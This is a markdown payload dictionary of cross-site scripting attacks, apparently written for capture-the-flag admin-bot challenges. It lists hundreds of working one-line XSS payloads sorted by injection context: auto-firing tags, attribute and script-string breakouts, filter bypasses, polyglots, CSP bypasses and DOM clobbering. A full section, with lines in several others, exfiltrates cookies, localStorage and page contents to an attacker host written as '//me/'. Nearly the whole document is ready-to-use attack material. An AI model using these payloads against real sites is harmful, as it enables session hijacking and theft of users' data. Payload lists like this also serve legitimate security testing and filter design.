# Payload dictionary — the sorted XSS corpus

One-line payloads, sorted by context and goal. Tags: [auto]=fires
without user interaction, [click]=needs click, [hover]=needs hover,
[focus]=needs autofocus/tabindex, [key]=needs keystroke, [ctx]=the
context where it lands. `events.md` explains the firing mechanics;
`contexts.md` the grammar; this is the corpus.

---

## 1. HTML body — auto-firing tag+event (the bot payloads)

```html
<img src=x onerror=alert(1)>                                    [auto]
<img src=x onerror=alert(document.domain)>                      [auto]
<img src=x onerror=alert(document.cookie)>                      [auto]
<img src=x onerror=fetch('//me/?c='+document.cookie)>           [auto]
<img src onerror=alert(1)>                                      [auto]
<img src=x onerror='alert(1)'>                                  [auto]
<img src=x onerror="alert(1)">                                  [auto]
<img src=`x` onerror=alert(1)>                                  [auto]
<img src=x onerror=alert(1)>                                    [auto]
<img srcset=x onerror=alert(1)>                                 [auto]
<img lowsrc=x onerror=alert(1)>                                 [auto]
<img dynsrc=x onerror=alert(1)>                                 [auto]
<svg onload=alert(1)>                                           [auto]
<svg/onload=alert(1)>                                           [auto]
<svg onload=alert(1)//                                          [auto]
<svg onload="alert(1)">                                         [auto]
<svg onload='alert(1)'></svg>                                   [auto]
<body onload=alert(1)>                                          [auto]
<iframe onload=alert(1)>                                        [auto]
<iframe/onload=alert(1)>                                        [auto]
<iframe src=javascript:alert(1)>                                [auto]
<iframe src="data:text/html,<script>alert(1)</script>">         [auto]
<iframe srcdoc="<script>alert(1)</script>">                     [auto]
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">          [auto]
<object onerror=alert(1)>                                       [auto]
<object data=x onerror=alert(1)>                                [auto]
<embed src=x onerror=alert(1)>                                  [auto]
<video><source onerror=alert(1)></video>                        [auto]
<video src=x onerror=alert(1)>                                  [auto]
<video poster=x onerror=alert(1)>                               [auto]
<audio src=x onerror=alert(1)>                                  [auto]
<audio><source onerror=alert(1)></audio>                        [auto]
<video autoplay onerror=alert(1)><source src=x></video>         [auto]
<audio autoplay onerror=alert(1)><source src=x></audio>         [auto]
<details open ontoggle=alert(1)>                                [auto]
<details open ontoggle="alert(1)">                              [auto]
<marquee onstart=alert(1)>x</marquee>                           [auto]
<marquee loop=1 onfinish=alert(1)>x</marquee>                   [auto]
<marquee onstart=alert(1) width=1>x</marquee>                   [auto]
<input type=image src=x onerror=alert(1)>                       [auto]
<input type=image src=x onerror='alert(1)'>                     [auto]
<isindex type=image src=x onerror=alert(1)>                     [auto]
<isindex action=javascript:alert(1) type=submit>                [click]
<keygen autofocus onfocus=alert(1)>                             [focus]
<keygen onfocus=alert(1) autofocus>                             [focus]
<input autofocus onfocus=alert(1)>                              [focus]
<select autofocus onfocus=alert(1)>                             [focus]
<textarea autofocus onfocus=alert(1)>                           [focus]
<button autofocus onfocus=alert(1)>                             [focus]
<video autofocus onfocus=alert(1)><source src=x></video>        [focus]
<a href=# autofocus onfocus=alert(1)>x</a>                      [focus]
<a id=x href=#x autofocus onfocus=alert(1)>x</a>                [focus]
<div contenteditable autofocus onfocus=alert(1)>x</div>         [focus]
<xss autofocus tabindex=1 onfocus=alert(1)></xss>               [focus]
<xss id=x tabindex=1 onfocus=alert(1) style="position:absolute;top:5000px">x</xss>  [focus+scroll]
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>  [auto]
<xss style="animation:x" onanimationstart="alert(1)"></xss>     [auto if keyframes exists]
<xss style="animation-name:spin" onanimationstart="alert(1)"></xss>  [auto]
<div style="animation:spin 1s" onanimationstart="alert(1)"></div>    [auto]
<xss style="transition:all 1s" ontransitionstart="alert(1)"></xss>   [auto-ish]
<body onpageshow=alert(1)>                                      [auto]
<body onfocus=alert(1)>                                         [semi]
<html onfocus=alert(1)>                                         [semi]
<xss onscroll=alert(1) style="display:block;overflow:auto;height:40px"><br><br><br>x</xss>  [scroll]
<div onscroll=alert(1) style="overflow:auto;height:40px"><br><br><br>x</div>  [scroll]
```

---

## 2. Script-tag payloads — need script allowed

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>fetch('//me/?c='+document.cookie)</script>
<script src=//me/x.js></script>
<script src="data:text/javascript,alert(1)"></script>
<script src=x onerror=alert(1)></script>
<script/onerror=alert(1) src=x></script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>                    -- backtick call
<script>alert`xss`</script>
<script>confirm`1`</script>
<script>prompt`1`</script>
<script>eval(`alert(1)`)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>(function(){alert(1)})()</script>
<script>self['alert'](1)</script>
<script>top['alert'](1)</script>
<script>window['alert'](1)</script>
<script>this['alert'](1)</script>
<script>globalThis['alert'](1)</script>
<script>[]['filter']['constructor']('alert(1)')()</script>
<script>({}).constructor.constructor('alert(1)')()</script>
<script>''.constructor.constructor('alert(1)')()</script>
<script>Function('alert(1)')()</script>
<script>new Function('alert(1)')()</script>
<script>setTimeout('alert(1)',0)</script>
<script>setTimeout(alert,0,1)</script>
<script>setInterval('alert(1)',100)</script>
<script>queueMicrotask(()=>alert(1))</script>
<script>Promise.resolve().then(()=>alert(1))</script>
<script>fetch('data:text/javascript,alert(1)').then(r=>r.text()).then(eval)</script>
<script>import('data:text/javascript,alert(1)')</script>
<script>import`data:text/javascript,alert(1)`</script>
<script>location='javascript:alert(1)'</script>
<script>location.hash='alert(1)';eval(location.hash.slice(1))</script>
<script>onerror=alert;throw 1</script>        -- window.onerror trick
<script>window.onerror=function(m){alert(m)};throw'x'</script>
```

---

## 3. Attribute-breakout payloads

```html
" onmouseover="alert(1)                                      [hover]
" onmouseover="alert(1)" x="                                 [hover]
" autofocus onfocus="alert(1)                                 [focus, input-ish]
" autofocus onfocus="alert(1)" x="                            [focus]
" contenteditable="true" onfocus="alert(1)                    [focus, any tag]
" tabindex="1" onfocus="alert(1)                              [focus]
" style="animation-name:x" onanimationstart="alert(1)         [auto w/ keyframes]
"><img src=x onerror=alert(1)>                                [auto]
"><svg onload=alert(1)>                                       [auto]
"><script>alert(1)</script>                                   [auto]
"><iframe srcdoc="<script>alert(1)</script>">                 [auto]
' onmouseover='alert(1)                                       [hover]
' autofocus onfocus='alert(1)                                 [focus]
'><img src=x onerror=alert(1)>                                [auto]
'><svg onload=alert(1)>                                       [auto]
x onmouseover=alert(1)                                         [unquoted, hover]
x onfocus=alert(1) autofocus                                   [unquoted]
x style=animation-name:x onanimationstart=alert(1)             [unquoted]
x><img src=x onerror=alert(1)>                                 [unquoted breakout]
" ><svg onload=alert(1)>                                       [auto]
" onpointerover="alert(1)                                      [hover]
" onpointerdown="alert(1)                                      [click]
" oncontextmenu="alert(1)                                      [right-click]
" onmouseenter="alert(1)                                       [hover]
" onclick="alert(1)                                            [click]
" ondblclick="alert(1)                                         [click]
" accesskey="x" onclick="alert(1)                              [key]
" oncopy="alert(1)                                             [copy]
" oncut="alert(1)                                              [cut]
" onpaste="alert(1)                                            [paste]
" oninput="alert(1)                                            [typing]
" onchange="alert(1)                                           [change]
" onkeydown="alert(1)                                          [key]
" onkeyup="alert(1)                                            [key]
" onwheel="alert(1)                                            [scroll]
" ondrag="alert(1)                                             [drag]
" ondrop="alert(1)                                             [drop]
```

---

## 4. href/src URL payloads

```html
javascript:alert(1)                                           [click]
javascript:alert(document.domain)                             [click]
JaVaScRiPt:alert(1)                                           [click]
JAVASCRIPT:alert(1)                                           [click]
java\tscript:alert(1)                                         [click]
java\nscript:alert(1)                                         [click]
java&#x09;script:alert(1)                                     [click]
java&Tab;script:alert(1)                                      [click]
&Tab;javascript:alert(1)                                      [click]
&NewLine;javascript:alert(1)                                  [click]
javascript&colon;alert(1)                                     [click]
&#106;avascript:alert(1)                                      [click]
&#x6a;avascript:alert(1)                                      [click]
jAvAsCrIpT&#x3a;alert(1)                                      [click]
javascript://comment%0aalert(1)                               [click]
javascript://x.com/%0aalert(1)                                [click]
javascript:alert`1`                                           [click]
javascript:eval(atob('YWxlcnQoMSk='))                         [click]
javascript:top['alert'](1)                                    [click]
javascript:[][(![]+[])[+[]]+...](`alert(1)`)()                [click, JSFuck]
vbscript:msgbox(1)                                            [click, IE only]
data:text/html,<script>alert(1)</script>                      [click, href]
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==   [click]
data:text/html,<svg onload=alert(1)>                          [click]
data:image/svg+xml,<svg onload=alert(1)>                      [iframe src]
data:text/html;charset=utf-8,<script>alert(1)</script>          [iframe]
```

---

## 5. Script-string breakout payloads

```javascript
";alert(1);//                     -- close str, run, comment rest
";alert(1)//                       -- no semicolon
";alert(1);"                       -- balanced
"-alert(1)-"                       -- expression
"+alert(1)+"                       -- concat-eval
'+alert(1)+'                       -- single-quoted
'-alert(1)-'                       -- single-quoted expr
';alert(1);//                      -- single-quote break
';alert(1)//
\';alert(1);//                     -- escape-eat: if app writes \'
\\';alert(1);//                    -- double-escape-eat
";alert(1);var x="y                -- rebalance
"};alert(1);//                     -- JSON object close
"};alert(1);var x={"y":"           -- balanced obj
</script><img src=x onerror=alert(1)>      -- script close
</script><svg onload=alert(1)>
</ScRiPt><img src=x onerror=alert(1)>
</script%20><img src=x onerror=alert(1)>
</script/x><img src=x onerror=alert(1)>
</script
><img src=x onerror=alert(1)>
${alert(1)}                        -- template literal inside `
`+alert(1)+`                       -- template concat
`-alert(1)-`                       -- template arith
`;alert(1);//                      -- template break
${`${alert(1)}`}                   -- nested template
${fetch`//me/${document.cookie}`}  -- tagged template exfil
);alert(1);//                      -- paren close
)};alert(1);//                     -- paren+brace close
;alert(1);//                       -- statement injection in expr ctx
```

---

## 6. JSON/data-island payloads

```javascript
"};alert(1);//                     -- obj close
"};alert(1);var x={"y":"           -- balanced
"}];alert(1);//                    -- array close
</script><img src=x onerror=alert(1)>      -- raw script close
{"x":"</script><img src=x onerror=alert(1)>"}
```

---

## 7. SVG payloads

```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert(1)"></svg>
<svg><script>alert(1)</script></svg>
<svg><script>alert(1)</script>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text
   x=20 y=20>click</text></a></svg>                                [click]
<svg><animate onbegin=alert(1) attributeName=x dur=1s>              [auto]
<svg><animate attributeName=x onbegin=alert(1) dur=1s></svg>        [auto]
<svg><set attributeName=onmouseover to=alert(1)>                    [hover]
<svg><set attributeName=href to=javascript:alert(1)><a>click</a></svg>  [click]
<svg><handler>alert(1)</handler>                                    [auto old]
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>    [auto]
<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">
   </foreignObject></svg>                                           [auto]
<svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)>#x">  [auto]
<svg><image href=x onerror=alert(1)></svg>                         [auto]
<svg><image href=x onerror='alert(1)'/>                            [auto]
<svg><discard onbegin=alert(1)>                                    [auto]
<svg><a xlink:href=javascript:alert(1)>x</a></svg>                  [click]
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href=
   "javascript:alert(1)">x</a></svg>                                [click]
```

---

## 8. MathML payloads

```html
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X</maction></math>  [hover]
<math><a xlink:href=javascript:alert(1)>x</a></math>               [click]
<math><a href=javascript:alert(1)>x</a></math>                      [click]
<math><mtext><img src=x onerror=alert(1)></math>                    [auto]
<math><mtext><table><mglyph><style><!--</style><img src=x
   onerror=alert(1)>                                                [mxss]
<math><annotation-xml encoding="text/html"><img src=x
   onerror=alert(1)></annotation-xml></math>                        [auto]
<math><annotation-xml encoding="text/html"><svg onload=alert(1)>
   </annotation-xml></math>                                         [auto]
```

---

## 9. RCDATA escapes — textarea/title/xmp/plaintext

```html
</textarea><img src=x onerror=alert(1)>
</textarea><svg onload=alert(1)>
</title><img src=x onerror=alert(1)>
</title><svg onload=alert(1)>
</xmp><img src=x onerror=alert(1)>
</plaintext><script>alert(1)</script>
</noframes><img src=x onerror=alert(1)>
</noembed><img src=x onerror=alert(1)>
</iframe><img src=x onerror=alert(1)>
</style><img src=x onerror=alert(1)>          -- escape style block
</script><img src=x onerror=alert(1)>          -- escape script block
</listing><img src=x onerror=alert(1)>
</pre><img src=x onerror=alert(1)>             -- pre isn't RCDATA but
                                               -- worth the probe
</select><img src=x onerror=alert(1)>
</option><img src=x onerror=alert(1)>
</optgroup><img src=x onerror=alert(1)>
</legend><img src=x onerror=alert(1)>
</button><img src=x onerror=alert(1)>
</noscript><img src=x onerror=alert(1)>        -- scripting-off only
</template><img src=x onerror=alert(1)>        -- template escape
--><img src=x onerror=alert(1)><!--            -- comment escape
--!><img src=x onerror=alert(1)>
]]><img src=x onerror=alert(1)>                -- cdata escape (svg/xml)
```

---

## 10. srcdoc payloads

```html
<iframe srcdoc="<script>alert(1)</script>">
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
<iframe srcdoc="&lt;svg onload=alert(1)&gt;">
<iframe srcdoc="<img src=x onerror=alert(1)>">
<iframe srcdoc="<svg onload=alert(parent.document.domain)>">
<iframe srcdoc="<script>fetch('//me/?c='+document.cookie)</script>">
<iframe srcdoc="&lt;script&gt;fetch('//me/?c='+document.cookie)&lt;/script&gt;">
<iframe srcdoc="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">
```

---

## 11. DOM-sink payloads (dom-xss.md)

```javascript
// hash → innerHTML:
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
#<script>alert(1)</script>            -- innerHTML does NOT run script
                                      -- but img/svg handlers DO fire
#<img src=x onerror=alert(1)>

// eval/Function/setTimeout sources:
#alert(1)                             -- if eval(location.hash.slice(1))
#alert(document.cookie)
#alert(1)//
');alert(1);//                        -- inside eval('x = "..."')

// location.href assignment:
javascript:alert(1)

// jQuery sinks:
#<img src=x onerror=alert(1)>          -- $.html()/append()
#<svg onload=alert(1)>
#<a href=javascript:alert(1)>x</a>
#<details open ontoggle=alert(1)>
```

---

## 12. Filter-bypass payload variants

```html
<ScRiPt>alert(1)</ScRiPt>               -- case
<scr<script>ipt>alert(1)</scr</script>ipt>   -- nested-strip removal
<scri<script>pt>alert(1)</scri<script>pt>
<SCRIPT/x>alert(1)</SCRIPT>
<script/x>alert(1)</script>
<script%20>alert(1)</script>
<img src=x onerror=alert(1)//>
<img src="x"onerror="alert(1)">
<img src=x onerror=alert(1)%00>
<img/src=x onerror=alert(1)>
<img src=x%09onerror=alert(1)>            -- tab
<img src=x%0aonerror=alert(1)>            -- LF
<img src=x%0conerror=alert(1)>            -- FF
<img src=x%0donerror=alert(1)>            -- CR
<img src=x/onerror=alert(1)>              -- /
<img%20src=x%20onerror=alert(1)>
<img src =x onerror =alert(1)>
<img src=x onerror= alert(1)>
<img src=x onerror = alert(1) >
<img src=`x`onerror=`alert(1)`>
<img src="x"onerror=`alert(1)`>           -- backtick in event handler
<img src=x onerror=alert`1`>               -- backtick-call inside handler
<img src=x onerror=self['al'+'ert'](1)>    -- bracket-call
<img src=x onerror=window['alert'](1)>
<img src=x onerror=top['alert'](1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval('al'+'ert(1)')>
<img src=x onerror=setTimeout('alert(1)',0)>
<img src=x onerror=new Function('alert(1)')()>
<img src=x onerror=Function('alert(1)')()>
<img src=x onerror=[].filter.constructor('alert(1)')()>
<img src=x onerror=(function(){alert(1)})()>
<img src=x onerror=(()=>{alert(1)})()>
<img src=x onerror=alert.call(null,1)>
<img src=x onerror=alert.apply(null,[1])>
<img src=x onerror=alert.bind(null,1)()>
<img src=x onerror=Reflect.apply(alert,null,[1])>
<img src=x onerror=onerror=alert(1)>
<img src=x onerror="al"+"ert"(1)>
<img src=x onerror="a lert(1)".replace(' ','')>
<img src=x onerror=eval('alert'+'(1)')>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=eval(`alert(1)`)>
<img src=x onerror=eval`\x61lert(1)`>       -- template + hex escape
<img src=x onerror=eval`\u0061lert(1)`>     -- unicode escape
```

---

## 13. Alert-alternatives — when alert() is filtered

```javascript
alert`1`                    -- tagged-template call
alert.call(null,1)
alert.apply(null,[1])
alert.bind(null,1)()
Reflect.apply(alert,null,[1])
top.alert(1)  self.alert(1)  window.alert(1)  parent.alert(1)
frames.alert(1)  globalThis.alert(1)  this.alert(1)
confirm(1)  confirm`1`  prompt(1)  prompt`1`
print()                        -- print dialog IS the proof
console.log(1)                 -- silent proof via console
throw 1                        -- unhandled error
onerror=alert;throw 1
eval('alert(1)')  eval`alert(1)`
eval(atob('YWxlcnQoMSk='))      -- base64
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
new Function('alert(1)')()     Function('alert(1)')()
setTimeout('alert(1)')         setInterval('alert(1)',1)
queueMicrotask(()=>alert(1))
Promise.resolve().then(()=>alert(1))
(async()=>alert(1))()
(function(){alert(1)})()
(()=>alert(1))()               -- arrow IIFE
[]['filter']['constructor']('alert(1)')()
''['constructor']['constructor']('alert(1)')()
({}).constructor.constructor('alert(1)')()
(0).constructor.constructor('alert(1)')()
[][[]].constructor.constructor('alert(1)')()
eval.call(null,'alert(1)')     -- indirect eval
decodeURI('%61lert(1)')        -- decoded fn name — needs eval wrap
unescape('alert%281%29')       -- deprecated but works
escape(...)/unescape(...)
document.write('<img src=x onerror=alert(1)>')  -- DOM write
document.writeln('<img src=x onerror=alert(1)>')
document.domain                -- proof-of-context (not alert)
fetch('//me/?'+document.domain)  -- exfil = proof
new Image().src='//me/?'+document.domain
location='//me/?'+document.domain   -- navigation = proof
```

---

## 14. Polyglot payloads — work across contexts

```html
'">><img src=x onerror=alert(1)>         -- attr-or-body polyglot
'"><img src=x onerror=alert(1)>
'" onmouseover="alert(1)                 -- attr breakout any-quote
'"> <svg onload=alert(1)> <
'";alert(1);//                          -- str-break + stmt
javascript:alert(1)//                    -- url-or-script
</script><img src=x onerror=alert(1)>   -- script-or-html
--><img src=x onerror=alert(1)><!--      -- comment-or-body
'"><img src=x onerror=alert(1)><"        -- wrap-pair
'><svg onload=alert(1)>"                 -- single-side polyglot
" onfocus="alert(1)" autofocus="         -- balanced-attr polyglot
' onfocus='alert(1)' autofocus='         -- single-quote variant
"/><img src=x onerror=alert(1)>"          -- self-close then breakout
<img src=x onerror=alert(1)>//           -- tag + comment tail
<a href=javascript:alert(1)>x</a><img src=x onerror=alert(1)>
   -- url AND tag polyglot
'`"><img src=x onerror=alert(1)>          -- any-quote breakout
'"`><img src=x onerror=alert(1)>
```

The famous multi-context polyglots (from the OWASP/portswigger
lists):

```html
-->'"/></script><svg onload=alert(1)>
-->'"/><img src=x onerror=alert(1)>
'"--></style></script><svg onload=alert(1)>
'"--></title></style></textarea></script><svg onload=alert(1)>
'"--></title></style></textarea></script><img src=x onerror=alert(1)>
'"--></textarea></style></script><img src=x onerror=alert(1)>
'"--></select></option></textarea></script><svg onload=alert(1)>
'"--></noembed></noframes></noscript></select></option></title>
   </style></textarea></script><img src=x onerror=alert(1)>
   -- the kitchen-sink form — fires from nearly any context
`"'><img src=x onerror=alert(1)>
javascript:"/*'/*`/*--></title></textarea></style></noscript>
   </noembed></noframes></script></html></xmp></pre></svg>
   "onmouseover="/*alert(1)//`//*/
   -- the deep polyglot — body+attr+js-string+comment+rcdata
```

---

## 15. Exfiltration payloads — bot-triggered data theft

```javascript
// the cookie steal family (cookie accessible):
fetch('//me/?c='+document.cookie)
new Image().src='//me/?c='+document.cookie
navigator.sendBeacon('//me/',document.cookie)
location='//me/?c='+document.cookie
location.href='//me/?c='+document.cookie
location.assign('//me/?c='+document.cookie)
location.replace('//me/?c='+document.cookie)
document.location='//me/?c='+document.cookie
top.location='//me/?c='+document.cookie
parent.location='//me/?c='+document.cookie
window.open('//me/?c='+document.cookie)
document.write('<img src=//me/?c='+document.cookie+'>')
document.writeln('<img src=//me/?c='+document.cookie+'>')
var i=new Image();i.src='//me/?c='+document.cookie;
var i=document.createElement('img');i.src='//me/?c='+document.cookie;
   document.body.appendChild(i);
var s=document.createElement('script');s.src='//me/x.js';
   document.head.appendChild(s);
var l=document.createElement('link');l.rel='prefetch';
   l.href='//me/?c='+document.cookie;document.head.appendChild(l);
fetch('//me/?c='+btoa(document.cookie))       -- b64-safe transport
fetch('//me/',{method:'POST',body:document.cookie})
fetch('//me/'+encodeURIComponent(document.cookie))
fetch('//me/',{method:'POST',mode:'no-cors',body:document.cookie})
new WebSocket('ws://me/').onopen=function(){this.send(document.cookie)}
EventSource&&new EventSource('//me/?c='+document.cookie)
new Image().src='//x/?'+btoa(document.body.innerHTML)   -- DOM exfil
fetch('//me/?dom='+btoa(document.documentElement.outerHTML))
fetch('//me/?dom='+btoa(new XMLSerializer()
   .serializeToString(document)))
fetch('//me/',{method:'POST',body:JSON.stringify({
   cookies:document.cookie,dom:document.body.innerHTML,
   url:location.href,storage:{...localStorage}})})

// HttpOnly-cookie → read the PAGE the bot sees:
fetch('/admin/flag').then(r=>r.text()).then(t=>
   fetch('//me/?f='+btoa(t)))
fetch('/flag').then(r=>r.text()).then(t=>
   new Image().src='//me/?f='+btoa(t))
fetch('/api/me').then(r=>r.json()).then(j=>
   fetch('//me/?u='+btoa(JSON.stringify(j))))

// the app-as-channel (no outbound):
document.forms[0].comment.value=document.cookie;
   document.forms[0].submit();
fetch('/api/note',{method:'POST',body:document.cookie,
   headers:{'Content-Type':'text/plain'}})
localStorage.exfil=document.cookie;      -- then read via another
   -- page the bot loads that leaks localStorage to you
```

---

## 16. CSP-aware payloads (csp.md is the full file)

```html
<!-- nonce known -->
<script nonce="KNOWN_NONCE">alert(1)</script>
<img src=x onerror=alert(1) nonce="KNOWN_NONCE">  -- handlers don't
                                                   -- need nonce!

<!-- strict-dynamic: need a trusted call -->
<script src="//trusted.cdn/angular.js"></script>
<script src="//me/x.js" integrity="bad-hash">      -- SRI fails →
                                                   -- doesn't run

<!-- unsafe-inline allows the whole inline surface -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>

<!-- JSONP callback on allowed domain -->
<script src="https://allowed.com/jsonp?cb=alert"></script>
   → serves alert(<data>) — alert() is your callback

<!-- base-uri hijack -->
<base href="//me/">                  -- relative URLs → your host
```

---

## 17. Click-required stored payloads (moderator-bot variants)

```html
<a href=javascript:alert(1)>click me</a>
<a href="javascript:fetch('//me/?c='+document.cookie)">click me</a>
<a href="data:text/html,<script>alert(1)</script>">x</a>
<button formaction=javascript:alert(1)>x</button>
<form action=javascript:alert(1)><button>x</button></form>
<input type=submit formaction=javascript:alert(1)>
<input type=submit formaction="javascript:fetch('//me/?c='+document.cookie)">
<a href="#" onclick="fetch('//me/?c='+document.cookie);return false">x</a>
<a href="#" onmouseover="fetch('//me/?c='+document.cookie)">x</a>
<div style="position:fixed;inset:0" onmouseover="alert(1)">x</div>
   -- full-screen overlay → hover anywhere fires
<div style="position:fixed;inset:0" onclick="alert(1)">x</div>
<a href=# style="display:block;width:100%;height:100vh"
   onclick="alert(1)">x</a>
```

---

## 18. UTF-7 / charset-confusion payloads

```html
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+ADw-img src=x onerror=alert(1)+AD4-
+ADw-svg onload=alert(1)+AD4-
%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-
```

Only fire when the page's charset is utf-7 (settable via
`<meta charset=utf-7>` — rare, or forced via framing a page that
lacks a charset header). Mostly a legacy shape — keep one probe.

---

## 19. DOM-clobbering payloads

```html
<!-- clobber a global the page's JS reads: -->
<a id=x></a><a id=x name=y href=javascript:alert(1)></a>
<img id=x name=y src=javascript:alert(1)>
<form id=x name=y><input name=z></form>
<iframe name=x srcdoc="<img id=y src=javascript:alert(1)>">
<!-- the classic window.x clobber -->
<a id=config href=javascript:alert(1)>x</a>
   -- if JS does config.url → becomes javascript:alert(1) →
      location-assigned or fetch'd → code runs
<a id="x" name="y" href="javascript:alert(1)">x</a>
   -- window.x.y = the anchor element
<img src=x id=attributes name=href>
   -- attributes.href clobber
```

---

## 20. The index — goal → section

| Goal | Section |
|---|---|
| prove exec (bot) | §1 auto-firing |
| prove exec w/ script allowed | §2 |
| attr breakout | §3 |
| url/href injection | §4 |
| inside JS string | §5 |
| inside JSON block | §6 |
| svg/math | §7-§8 |
| RCDATA escape | §9 |
| srcdoc | §10 |
| DOM sinks | §11 |
| filtered | §12 |
| no `alert` allowed | §13 |
| unknown context | §14 polyglots |
| steal data | §15 |
| CSP'd | §16 |
| click-needed | §17 |
| utf-7 | §18 |
| dom clobber | §19 |

The working set for an admin-bot challenge: §1 rows with
`fetch('//me/?c='+document.cookie)` as the handler — that's the
whole play when cookies are readable.
